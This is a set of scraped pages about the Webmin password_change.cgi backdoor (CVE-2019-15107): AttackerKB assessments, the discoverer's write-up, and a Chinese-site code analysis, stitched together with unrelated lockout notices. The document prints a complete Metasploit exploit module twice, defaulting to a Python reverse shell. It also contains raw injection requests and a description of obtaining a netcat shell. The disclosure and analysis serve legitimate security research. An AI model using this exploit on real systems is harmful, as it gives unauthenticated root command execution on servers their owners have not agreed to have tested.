This is bound to have many vulnerable installations that may persist for some time, since webmin tends to be used by novice admins.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/b13d216f-2a27-41b0-b1c2-5048e98bdedc)
[Delete Assessment and Exploited in the Wild Report](/assessments/b13d216f-2a27-41b0-b1c2-5048e98bdedc)

[Log in to Add Reply](/login)

[See More &2 repliesSee Less](#analysis-b13d216f-2a27-41b0-b1c2-5048e98bdedc)

0

[![](https://avatars0.githubusercontent.com/u/41241640?v=4&s=50)](/contributors/hack8080)

**[hack8080 (0)](/contributors/hack8080)**
[July 08, 2020 2:58pm UTC (4 years ago)](/comments/d3c3b682-aafb-41f5-9afa-c5a9d57d5f99)•
Edited 4 years ago ▾

What type of attack was this? how this was added to the code for Webmin, not how this results in remote code execution (RCE).

0

[![](https://avatars.githubusercontent.com/u/4108654?v=4&s=50)](/contributors/busterb)

**[busterb (317)](/contributors/busterb)**
[July 08, 2020 3:22pm UTC (4 years ago)](/comments/47121204-76ee-4d80-960c-74079d2377d0)•Edited 4 years ago

There is more information here on how the attack was carried out: <http://www.webmin.com/exploit.html>

From the article:

> At some time in April 2018, the Webmin development build server was exploited and a vulnerability added to the password\_change.cgi script. Because the timestamp on the file was set back, it did not show up in any Git diffs. This was included in the Webmin 1.890 release.

4

[![](https://avatars.githubusercontent.com/u/30129546?v=4&s=50)](/contributors/ZM-20-20)

**[ZM-20-20 (5)](/contributors/ZM-20-20)**

[January 30, 2021 1:40am UTC (3 years ago)](/assessments/c5232a52-f7e0-4fcb-a391-deb5c5d33d52)•Edited 3 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  High
[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)
###### Technical Analysis

Almost 2 years later and this is still found in the wild.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/c5232a52-f7e0-4fcb-a391-deb5c5d33d52)
[Delete Assessment and Exploited in the Wild Report](/assessments/c5232a52-f7e0-4fcb-a391-deb5c5d33d52)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-c5232a52-f7e0-4fcb-a391-deb5c5d33d52)

3

[![](https://avatars.githubusercontent.com/u/17987018?v=4&s=50)](/contributors/bwatters-r7)

**[bwatters-r7 (202)](/contributors/bwatters-r7)**
![](/static/public/img/Badges-40-assessments.svg)

[August 22, 2019 10:22pm UTC (5 years ago)](/assessments/aed990bb-8f2e-4a05-a7f9-bb2f81e5d94c)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
###### Technical Analysis

This is a terrible situation for any development team. A hacker took over a server that managed webmin code and changed the code in a subtle way to allow them (or others) to execute commands as root on computers running Webmin. It took nearly a year and a half for the attack to be discovered and fixed.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/aed990bb-8f2e-4a05-a7f9-bb2f81e5d94c)
[Delete Assessment and Exploited in the Wild Report](/assessments/aed990bb-8f2e-4a05-a7f9-bb2f81e5d94c)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-aed990bb-8f2e-4a05-a7f9-bb2f81e5d94c)

2

[![](https://avatars2.githubusercontent.com/u/23102036?v=4&s=50)](/contributors/jrobles-r7)

**[jrobles-r7 (40)](/contributors/jrobles-r7)**
![](/static/public/img/Badges-10-assessments.svg)

[August 20, 2019 6:02pm UTC (5 years ago)](/assessments/51e9af72-003f-4e05-a8a3-2a53c8a8da27)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
###### Technical Analysis

I tested Webmin v1.900 and the password change page was not available by default, however it is a reasonable option to have.

A valid username is not needed for the exploit, although the command injection did not work for me when I used the valid username `root`.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/51e9af72-003f-4e05-a8a3-2a53c8a8da27)
[Delete Assessment and Exploited in the Wild Report](/assessments/51e9af72-003f-4e05-a8a3-2a53c8a8da27)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-51e9af72-003f-4e05-a8a3-2a53c8a8da27)

2

[![](https://avatars.githubusercontent.com/u/10050455?v=4&s=50)](/contributors/sgonzalez-r7)

**[sgonzalez-r7 (8)](/contributors/sgonzalez-r7)**

[August 26, 2019 4:31pm UTC (5 years ago)](/assessments/7e0dad7b-b6e2-4019-ada9-71c17fb11b4e)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/7e0dad7b-b6e2-4019-ada9-71c17fb11b4e)
[Delete Assessment and Exploited in the Wild Report](/assessments/7e0dad7b-b6e2-4019-ada9-71c17fb11b4e)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-7e0dad7b-b6e2-4019-ada9-71c17fb11b4e)

1

[![](https://avatars0.githubusercontent.com/u/23720062?v=4&s=50)](/contributors/P1d0f)

**[P1d0f (2)](/contributors/P1d0f)**

[July 10, 2020 4:11am UTC (4 years ago)](/assessments/a8c51e57-6cf7-4226-a3db-e7afe74956b9)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  High
[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)
###### Technical Analysis

High Vulnerability

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/a8c51e57-6cf7-4226-a3db-e7afe74956b9)
[Delete Assessment and Exploited in the Wild Report](/assessments/a8c51e57-6cf7-4226-a3db-e7afe74956b9)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-a8c51e57-6cf7-4226-a3db-e7afe74956b9)

1

[![](https://avatars1.githubusercontent.com/u/8684677?v=4&s=50)](/contributors/69)

**[69 (2)](/contributors/69)**

[February 28, 2020 4:26pm UTC (4 years ago)](/assessments/5a7e4ccf-3765-4796-bb8d-a0082daf95d0)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)
###### Technical Analysis

This vulnerability is very easy to exploit – without the need for any tools specialized for this attack.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/5a7e4ccf-3765-4796-bb8d-a0082daf95d0)
[Delete Assessment and Exploited in the Wild Report](/assessments/5a7e4ccf-3765-4796-bb8d-a0082daf95d0)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-5a7e4ccf-3765-4796-bb8d-a0082daf95d0)

0

[![](https://avatars.githubusercontent.com/u/76797762?v=4&s=50)](/contributors/KoelhoSec)

**[KoelhoSec (1)](/contributors/KoelhoSec)**

[April 09, 2021 2:48am UTC (3 years ago)](/assessments/f9c47c50-f559-443f-ba90-053f2008a6bf)•Edited 3 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)
###### Technical Analysis

MetaSploit module available:

exploit/linux/http/webmin\_backdoor

Description:

This module exploits a backdoor in Webmin versions 1.890 through

1.920. Only the SourceForge downloads were backdoored, but they are

listed as official downloads on the project’s site. Unknown

attacker(s) inserted Perl qx statements into the build server’s

source code on two separate occasions: once in April 2018,

introducing the backdoor in the 1.890 release, and in July 2018,

reintroducing the backdoor in releases 1.900 through 1.920. Only

version 1.890 is exploitable in the default install. Later affected

versions require the expired password changing feature to be

enabled.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/f9c47c50-f559-443f-ba90-053f2008a6bf)
[Delete Assessment and Exploited in the Wild Report](/assessments/f9c47c50-f559-443f-ba90-053f2008a6bf)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-f9c47c50-f559-443f-ba90-053f2008a6bf)

### General Information

Offensive Application
remote
Utility Class
rce
Ports
10000
OS

Unknown

Vulnerable Versions
Webmin <= v1.920
Prerequisites

Unknown

Discovered By
Özkan Mustafa Akkuş
PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Metasploit Modules

[exploit/linux/http/webmin\_backdoor (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin\_backdoor.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb)

### Exploited in the Wild

Reported by:
![](https://avatars.githubusercontent.com/u/37747628?v=4&s=50)

[gdft2112](/contributors/gdft2112)

[Reported: January 11, 2021 8:47am UTC (4 years ago)](#exploited-in-the-wild_ba24e559-6896-4151-b079-b8ae8fa90ea4)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_ba24e559-6896-4151-b079-b8ae8fa90ea4)

![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)

[gwillcox-r7](/contributors/gwillcox-r7)
 indicated sources as

* Government or Industry Alert [(https://www.cisa.gov/known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
* Threat Feed [(https://unit42.paloaltonetworks.com/mirai-variant-v3g4/)](https://unit42.paloaltonetworks.com/mirai-variant-v3g4/)

[Reported: March 28, 2022 4:45pm UTC (2 years ago)](#exploited-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677) •
Edited 1 year ago

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

### References

##### Canonical

[CVE-2019-15107 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107)
##### Miscellaneous

<https://chybeta.github.io/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change><https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html>

### Additional Info

Authenticated

Never
Exploitable

Always
Reliability

Very Strong
Stability

Very Strong
Available Mitigations

Very Strong
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7

###### Technical Analysis

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from www.pentest.com.tr_853c7aec_20250121_002233.html ===

ââââââ âââ ââââââ ââââââ âââââââââââ
âââââââââââ âââââââ âââââââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââ ââââââ ââââââ ââââââââââââââââââââ
âââ ââââââ ââââââ âââ âââââââ ââââââââ
"I know Hack and I believe in Hak. So...You have no chance :/"

* [Root](../index.html)
* [Blog](/blog/)
* [Pentest](/pentest/)
* [Whoami](/whoami/)
* [Exploits](/exploits/)

## EDB-ID: 47230

## CVE-2019-15107

10 Aug, 2019
â¢
EXPLOIT

- This 0day has been published at @DEFCON AppSec Village by me
- Vendor fixed this vulnerability. [Webmin must update to the 1.930 version.](http://webmin.com/changes.html)
- [Exploit-DB Link](https://www.exploit-db.com/exploits/47230)
- [CVE-Mitre Link](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
- [Download defcon\_webmin\_unauth\_rce.rb (Metasploit)](https://pentest.com.tr/blog/defcon-0days-10102019/defcon_webmin_unauth_rce.rb)
The vulnerability was secretly planted by an unknown hacker who successfully managed to inject a BACKDOOR at some point in its build infrastructure that surprisingly persisted into various releases of Webmin (1.882 through 1.921) and eventually remained hidden for over a year.Developers confirmed that the official Webmin downloads were replaced by the backdoored packages only on the project's SourceForge repository, and not on the Webmin's Github repositories.I have placed the reference links on this situation below.
### References and Explanations

- [Reddit discussions](https://www.reddit.com/r/netsec/comments/crk77z/0day_remote_code_execution_for_webmin/)
- [The first explanation from the developers.](https://www.virtualmin.com/node/66890)
- [The latest explanation from the developers "What Happened?"](http://www.webmin.com/exploit.html)
- [Press News (thehackernews)](https://thehackernews.com/2019/08/webmin-vulnerability-hacking.html)
- [Press News (zdnet)](https://www.zdnet.com/article/backdoor-found-in-webmin-a-popular-web-based-utility-for-managing-unix-servers/)
- [Security alert from Tenable](https://www.tenable.com/blog/cve-2019-15107-exploit-modules-available-for-remote-code-execution-vulnerability-in-webmin)
## Webmin <= 1.920 - Unauthenticated RCE

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.882 <= 1921 Unauthenticated RCE',
      'Description'    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.920 and prior versions. If the password change module is turned on, the unathenticated user
        can execute arbitrary commands with root privileges.

        Webmin 1.890 is vulnerable in the default configuration, while the other affected versions
        require the âuser password changeâ option to be enabled.

        /////// This 0day has been published at DEFCON-AppSec Village. ///////

      ),
      'Author'         => [
        'AkkuS <Ãzkan Mustafa AkkuÅ>' # Discovery & PoC & Metasploit module @ehakkus
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2019-'],
          ['URL', 'https://www.pentest.com.tr']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_python'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.910', {}]],
      'DisclosureDate' => 'May 16 2019',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
  ##
  # Target and input verification
  ##
  def check
    # check passwd change priv
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, "password_change.cgi"),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'cookie'  => "redirect=1; testing=1; sid=x; sessiontest=1"
    })

    if res && res.code == 200 && res.body =~ /Failed/
      res = send_request_cgi(
        {
        'method' => 'POST',
        'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/session_login.cgi"
          },
        'data' => "user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss"
        })

      if res && res.code == 200 && res.body =~ /password_change.cgi/
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    else
      return CheckCode::Safe
    end
  end

  ##
  # Exploiting phase
  ##
  def exploit

    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    command = payload.encoded
    print_status("Attempting to execute the payload...")
    handler

    res = send_request_cgi(
      {
      'method' => 'POST',
      'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
      'ctype'  => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'data' => "user=root&pam=&expired=2&old=AkkuS%7c#{command}%20&new1=akkuss&new2=akkuss"
      })

  end
end

```
in webmin, the "user password change" must be allowed for the exploit vulnerability.
this is the only condition. Many webmin managers enable this feature. They allows users to set a new password with the old password.
Let's take a closer look at this.Webmin 1.890 is vulnerable in the default configuration, while the other affected versions
require the âuser password changeâ option to be enabled.While researching on the Webmin application, I noticed some interesting ".cgi" files. One of them is "password\_change.cgi"![](../images/defwebmin20-1.png)There is only one requirement for the parameters in this file to work, that the "passwd\_mode" value in the "miniserv.conf" configuration file is set to "2".
```

$miniserv{'passwd_mode'} == 2 || die "Password changing is not enabled!";

```
![](../images/defwebmin20-2.png)So how does the administrator activate this configuration? let's check...In the "Webmin> Webmin Configuration> Authentication" section, "Prompt users with expired passwords to enter a new one" should be checked. This means a value of "2" for "password\_change" in "miniserv.conf".![](../images/defwebmin20-3.png)After this configuration, users can change their expired password by verifying their old password.So where exactly is the vulnerability? Let's back to "password\_change.cgi".![](../images/defwebmin20-4.png)"password\_change.cgi" sends the old password to "encrypt\_password" function in "acl/acl-lib.pl"This function calls the other function "unix\_crypt".In another section, the same function "unix\_crypt" is called again for "Validate old password".![](../images/defwebmin20-5.png)At this point, we will use "vertical bar (|)" by reading the shadow file during validating the old password.Let's look at this by sending a request with the burp suite.![](../images/defwebmin20-6.png)We sent a request with an ordinary "POST" data, and naturally gave an error "Failed to change password: The current password is incorrect".The vulnerability is exactly included in the "old" parameter.It doesn't matter if the username, old password or other information is correct.The file "password\_change.cgi" will check the information in the "old" parameter on the server. It won't even check if the username is correct or not.we will now use "vertical bar (|)" and try to run a different command on the server.![](../images/defwebmin20-7.png)As you can see, the command "ifconfig" is executed by the server and the output is shown.Now let's send a malicious payload to the server and receive shell session.I'll use "netcat" payload for proof. Because I know there is netcat on the server.![](../images/defwebmin20-8.png)![](../images/defwebmin20-9.png)As you can see the shell was received. When we run the command "pwd", we can see that the malicious payload is executed in the "acl" folder. Because the function is called here.![](../images/defwebmin20-15.png)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

Â© Copyright, 2017 | Sponsored by- [National Keep](https://nationalkeep.com)



=== Content from pentest.com.tr_80ca6f30_20250121_023024.html ===
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update\_info(info,
'Name' => 'Webmin 1.920 Unauthenticated RCE',
'Description' => %q(
This module exploits an arbitrary command execution vulnerability in Webmin
1.920 and prior versions. If the password change module is turned on, the unathenticated user
can execute arbitrary commands with root privileges.
/////// This 0day has been published at DEFCON-AppSec Village. ///////
),
'Author' => [
'AkkuS <Özkan Mustafa Akkuş>' # Discovery & PoC & Metasploit module @ehakkus
],
'License' => MSF\_LICENSE,
'References' =>
[
['CVE', '2019-'],
['URL', 'https://www.pentest.com.tr']
],
'Privileged' => true,
'Payload' =>
{
'DisableNops' => true,
'Space' => 512,
'Compat' =>
{
'PayloadType' => 'cmd'
}
},
'DefaultOptions' =>
{
'RPORT' => 10000,
'SSL' => false,
'PAYLOAD' => 'cmd/unix/reverse\_python'
},
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Targets' => [['Webmin <= 1.910', {}]],
'DisclosureDate' => 'May 16 2019',
'DefaultTarget' => 0)
)
register\_options [
OptString.new('TARGETURI', [true, 'Base path for Webmin application', '/'])
]
end
def peer
"#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
end
##
# Target and input verification
##
def check
# check passwd change priv
res = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, "password\_change.cgi"),
'headers' =>
{
'Referer' => "#{peer}/session\_login.cgi"
},
'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1"
})
if res && res.code == 200 && res.body =~ /Failed/
res = send\_request\_cgi(
{
'method' => 'POST',
'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
'ctype' => 'application/x-www-form-urlencoded',
'uri' => normalize\_uri(target\_uri.path, 'password\_change.cgi'),
'headers' =>
{
'Referer' => "#{peer}/session\_login.cgi"
},
'data' => "user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss"
})
if res && res.code == 200 && res.body =~ /password\_change.cgi/
return CheckCode::Vulnerable
else
return CheckCode::Safe
end
else
return CheckCode::Safe
end
end
##
# Exploiting phase
##
def exploit
unless Exploit::CheckCode::Vulnerable == check
fail\_with(Failure::NotVulnerable, 'Target is not vulnerable.')
end
command = payload.encoded
print\_status("Attempting to execute the payload...")
handler
res = send\_request\_cgi(
{
'method' => 'POST',
'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
'ctype' => 'application/x-www-form-urlencoded',
'uri' => normalize\_uri(target\_uri.path, 'password\_change.cgi'),
'headers' =>
{
'Referer' => "#{peer}/session\_login.cgi"
},
'data' => "user=root&pam=&expired=2&old=AkkuS%7c#{command}%20&new1=akkuss&new2=akkuss"
})
end
end


=== Content from packetstormsecurity.com_086281c0_20250121_002231.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from packetstormsecurity.com_cb57681e_20250121_002231.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from chybeta.github.io_f147a8e6_20250121_023020.html ===


[Chybeta](/)

* [首页](/)
* [归档](/archives)
* [分类](/categories)
* [标签](/tags)
* [朋友](/link)
* [关于我](/about)
* 搜索

close

![Chybeta]()

# 【CVE-2019-15107】:RCE in Webmin <= 1.920 via password-change

发表于
2019-08-19

|

分类于
[Web Security](/categories/Web-Security/)

|

阅读次数

![](https://xzfile.aliyuncs.com/media/upload/picture/20210805230907-147e9e28-f5ff-1.png)

CVE-2019-15107:RCE in Webmin <= 1.920 via password-change

中文：<https://xz.aliyun.com/t/6040>

# 0x01 Reproduce

* webmin 1.920
* Ubuntu

To reproduce this vulnerability, you need enable the password-change feature.

<https://ip:10000/webmin/edit_session.cgi?xnavigation=1> :

![1.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190818235759-f35212a2-c1d0-1.jpeg)

Then you can check the config and the `passwd_mode` value has been changed

| ``` 1234 ``` | ``` # cat /etc/webmin/miniserv.conf...passwd_mode=2... ``` |
| --- | --- |

![2.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190818235803-f5f5e60a-c1d0-1.jpeg)

You can capture post request like this:

| ``` 12345678910111213141516171819 ``` | ``` POST /password_change.cgi HTTP/1.1Host: yourip:10000Connection: closeContent-Length: 63Cache-Control: max-age=0Origin: https://yourip:10000Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Sec-Fetch-Mode: navigateSec-Fetch-User: ?1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Sec-Fetch-Site: same-originReferer: https://yourip:10000/session_login.cgiAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: redirect=1; testing=1; sessiontest=1; sid=xuser=root&pam=1&expired=2&old=buyaoxiedaopocli&new1=buyaoxiedaopocli&new2=buyaoxiedaopocli ``` |
| --- | --- |

Set the parameter `old` value as `|ifconfig`

![3.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190818235811-faee7f0a-c1d0-1.jpeg)

![4.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235816-fda2c2f6-c1d0-1.png)

# 0x02 Analysis

In password\_change.cgi ：

| ``` 123456789101112131415 ``` | ``` # line 18 ~ line 31# Is this a Webmin user?if (&foreign_check("acl")) {	&foreign_require("acl", "acl-lib.pl");	($wuser) = grep { $_->{'name'} eq $in{'user'} } &acl::list_users();	if ($wuser->{'pass'} eq 'x') {		# A Webmin user, but using Unix authentication		$wuser = undef;		}	elsif ($wuser->{'pass'} eq '*LK*' ||	       $wuser->{'pass'} =~ /^\!/) {		&pass_error("Webmin users with locked accounts cannot change ".		       	    "their passwords!");		}} ``` |
| --- | --- |

The code will check whether the parameter `user` is a Webmin user. If there is a Webmin user named `root` and we set `user=root`,then the `$wuser`‘s value will be `root`.

If we set `user=xxxx`，then `$wuser` will still be `undef` after `grep`。
![6.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235824-023c5d22-c1d1-1.png)

However the following is `$wuser->{'pass'}`，which will change `$wuser` value from `undef` to `{}`

![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235827-046dc978-c1d1-1.png)

![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235831-0687f062-c1d1-1.png)

So whatever `user` you have provided, you will be step in the code segment to update webmin user’s password.

* user=root

![8.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235834-08a19cfe-c1d1-1.png)

* user=noexists\_user

![9.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235840-0bbe4ea0-c1d1-1.png)

Now let’s check the `password_change.cgi` line 37 ~ line 40：

| ``` 123456 ``` | ``` if ($wuser) {	# Update Webmin user's password	$enc = &acl::encrypt_password($in{'old'}, $wuser->{'pass'});	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);	...} ``` |
| --- | --- |

The implemention of function `encrypt_password` is of no importance . You should pay attention to how Webmin handles the error message.

| ``` 1 ``` | ``` &pass_error($text{'password_eold'},qx/$in{'old'}/); ``` |
| --- | --- |

Webmin just put our parameter `old` in `qx/.../`！

![11.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235845-0eb3b636-c1d1-1.png)

And after executing system commands, Webmin will print the result:
![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190819000223-91013adc-c1d1-1.png)

So in conclusion there is no need to add a `vertical bar (|)` , we just set our parameter `old` value as `ifconfig`

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190819000304-a96d08da-c1d1-1.png)

By the way , there is an interesting issue <https://github.com/webmin/webmin/issues/947>

![12.png](https://xzfile.aliyuncs.com/media/upload/picture/20190818235853-13ad028c-c1d1-1.png)

# 0x03 Patch

webmin 1.930 fix this security vulnerability by removing the `qx()` backdoor：
![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190819000707-3a55d08e-c1d2-1.png)

微信扫码加入知识星球【漏洞百出】
![chybeta WeChat Pay](https://xzfile.aliyuncs.com/media/upload/picture/20210805230907-147e9e28-f5ff-1.png)

本文标题:[【CVE-2019-15107】:RCE in Webmin <= 1.920 via password-change](/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change/)

文章作者:[chybeta](/ "访问 chybeta 的个人博客")

发布时间:2019年08月19日 - 20:08

最后更新:2019年08月19日 - 21:08

原始链接:[http://chybeta.github.io/2019/08/19/【CVE-2019-15107】-RCE-in-Webmin-1-920-via-password-change/](/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change/ "【CVE-2019-15107】:RCE in Webmin <= 1.920 via password-change")

许可协议: [署名-非商业性使用-禁止演绎 4.0 国际](https://creativecommons.org/licenses/by-nc-nd/4.0/ "Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)") 转载请保留原文链接及作者。

[# 代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[# rce](/tags/rce/)
[# perl](/tags/perl/)
[# webmin](/tags/webmin/)

